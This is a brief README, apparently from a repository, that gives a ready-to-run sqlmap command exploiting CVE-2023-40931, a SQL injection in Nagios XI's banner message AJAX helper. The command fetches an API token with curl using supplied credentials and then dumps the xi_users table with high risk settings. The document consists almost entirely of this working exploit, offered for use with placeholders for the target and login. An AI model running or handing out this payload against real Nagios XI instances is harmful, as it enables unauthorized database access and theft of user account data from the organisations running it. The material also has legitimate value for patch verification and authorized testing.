# CVE-2023-40931
The sqlmap payload to exploit CVE-2023-40931

## Payload
Required Information:

- Valid Username and Password
- Domain and path of hosted instance

```
sqlmap -D nagiosxi -T xi_users -u "https://<INSTANCE>/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=`curl -ksX POST https://<INSTANCE>/nagiosxi/api/v1/authenticate -d "username=<USERNAME>&password=<PASSWORD>&valid_min=1000" | awk -F'"' '{print$12}'`" --dump --level 4 --risk 3 -p id --batch
```
